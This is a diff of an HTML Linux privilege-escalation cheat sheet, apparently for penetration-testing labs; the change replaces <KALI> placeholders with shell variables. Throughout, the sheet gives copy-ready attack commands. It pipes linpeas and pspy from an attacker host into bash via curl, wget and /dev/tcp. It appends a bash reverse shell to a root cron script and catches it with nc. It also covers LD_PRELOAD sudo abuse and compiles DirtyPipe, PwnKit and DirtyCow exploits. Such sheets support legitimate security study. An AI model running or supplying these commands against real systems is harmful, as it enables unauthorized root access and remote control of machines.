@@ -145,10 +145,10 @@
     <section class="sec" id="auto">
       <div class="sec-head"><h2>Automated Tools</h2></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">linpeas</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>curl -s http://&lt;KALI&gt;:8080/linpeas.sh | bash 2&gt;&amp;1 | tee /tmp/lpe.txt
-wget -q http://&lt;KALI&gt;:8080/linpeas.sh -O /tmp/lpe.sh &amp;&amp; chmod +x /tmp/lpe.sh &amp;&amp; /tmp/lpe.sh | tee /tmp/lpe.txt
+        <pre>curl -s http://$KALI:8080/linpeas.sh | bash 2&gt;&amp;1 | tee /tmp/lpe.txt
+wget -q http://$KALI:8080/linpeas.sh -O /tmp/lpe.sh &amp;&amp; chmod +x /tmp/lpe.sh &amp;&amp; /tmp/lpe.sh | tee /tmp/lpe.txt
 <span class="c"># If no curl/wget — pure bash download:</span>
-exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 | bash</pre></div>
+exec 3&lt;&gt;/dev/tcp/$KALI/8080 &amp;&amp; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" &gt;&amp;3 &amp;&amp; cat &lt;&amp;3 | bash</pre></div>
       <div class="sig">
         <span class="sig-title">output signals</span>
         <div class="sig-entry">
@@ -163,7 +163,7 @@ exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /linpeas.sh HTT
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> RED — writable cron script or cron running as root</span>
-          <span class="sig-cmd">echo 'bash -i >&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1' >> /opt/scripts/backup.sh <span class="sig-note">-- append rev shell to writable cron script</span></span>
+          <span class="sig-cmd">echo 'bash -i >&amp; /dev/tcp/$KALI/4444 0&gt;&amp;1' >> /opt/scripts/backup.sh <span class="sig-note">-- append rev shell to writable cron script</span></span>
           <span class="sig-cmd">rlwrap nc -lvnp 4444 <span class="sig-note">-- wait for cron to fire (max 1 min)</span></span>
         </div>
         <div class="sig-entry">
@@ -183,7 +183,7 @@ exec 3&lt;&gt;/dev/tcp/&lt;KALI&gt;/8080 &amp;&amp; echo -e "GET /linpeas.sh HTT
       </div>
     </section>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">pspy — watch processes without root</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre>wget -q http://&lt;KALI&gt;:8080/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy &amp;&amp; /tmp/pspy
+        <pre>wget -q http://$KALI:8080/pspy64 -O /tmp/pspy &amp;&amp; chmod +x /tmp/pspy &amp;&amp; /tmp/pspy
 <span class="c"># Look for: scripts run as UID=0, writable paths, cron commands you can't see in /etc/crontab</span></pre></div>
     </section>
 
@@ -237,7 +237,7 @@ void _init() {
 }
 CEOF
 gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
-sudo LD_PRELOAD=/tmp/preload.so &lt;any_allowed_binary&gt;</pre></div>
+sudo LD_PRELOAD=/tmp/preload.so $ALLOWED_BIN</pre></div>
       <div class="sig">
         <span class="sig-title">output signals</span>
         <div class="sig-entry">
@@ -251,7 +251,7 @@ sudo LD_PRELOAD=/tmp/preload.so &lt;any_allowed_binary&gt;</pre></div>
         </div>
         <div class="sig-entry">
           <span class="sig-signal"><span class="sig-label">Signal:</span> env_keep+=LD_PRELOAD in sudo -l output</span>
-          <span class="sig-cmd">gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles && sudo LD_PRELOAD=/tmp/preload.so &lt;allowed_binary&gt; <span class="sig-note">-- preload root shell</span></span>
+          <span class="sig-cmd">gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles && sudo LD_PRELOAD=/tmp/preload.so $ALLOWED_BIN <span class="sig-note">-- preload root shell</span></span>
         </div>
       </div>
       <div class="moveon">
@@ -331,7 +331,7 @@ systemctl list-timers --all   <span class="c"># systemd timers also run as root<
         <pre><span class="c"># If /etc/crontab has: * * * * * root /opt/scripts/backup.sh</span>
 <span class="c"># And you can write to /opt/scripts/backup.sh:</span>
 echo '#!/bin/bash' &gt; /opt/scripts/backup.sh
-echo 'bash -i &gt;&amp; /dev/tcp/&lt;KALI&gt;/4444 0&gt;&amp;1' &gt;&gt; /opt/scripts/backup.sh
+echo 'bash -i &gt;&amp; /dev/tcp/$KALI/4444 0&gt;&amp;1' &gt;&gt; /opt/scripts/backup.sh
 chmod +x /opt/scripts/backup.sh
 <span class="c"># Wait for next minute, catch on: rlwrap nc -lvnp 4444</span></pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">cron PATH hijack — relative commands</span><button class="cpb" onclick="cp(this)">copy</button></div>
@@ -383,7 +383,7 @@ su hacker   <span class="c"># password: hacker123</span></pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">identify + suggest</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre>uname -a
 cat /etc/os-release
-curl -s http://&lt;KALI&gt;:8080/linux-exploit-suggester.sh | bash 2&gt;&amp;1 | grep -A2 '\[CVE'</pre></div>
+curl -s http://$KALI:8080/linux-exploit-suggester.sh | bash 2&gt;&amp;1 | grep -A2 '\[CVE'</pre></div>
       <div class="cb"><div class="cb-head"><span class="cb-lbl">key exploits</span><button class="cpb" onclick="cp(this)">copy</button></div>
         <pre><span class="c"># DirtyPipe — CVE-2022-0847 (kernel 5.8–5.16.11):</span>
 uname -r   <span class="c"># must be 5.8–5.16.11</span>
@@ -397,7 +397,7 @@ gcc PwnKit.c -o PwnKit &amp;&amp; ./PwnKit
 
 <span class="c"># DirtyCow — CVE-2016-5195 (kernel 2.6.22–4.8.3):</span>
 <span class="c"># searchsploit dirty cow → 40839.c</span>
-gcc -pthread dirty.c -o dirty -lcrypt &amp;&amp; ./dirty &lt;newpassword&gt;
+gcc -pthread dirty.c -o dirty -lcrypt &amp;&amp; ./dirty $NEWPASS
 su firefart   <span class="c"># user created by dirty cow</span></pre></div>
     </section>
 
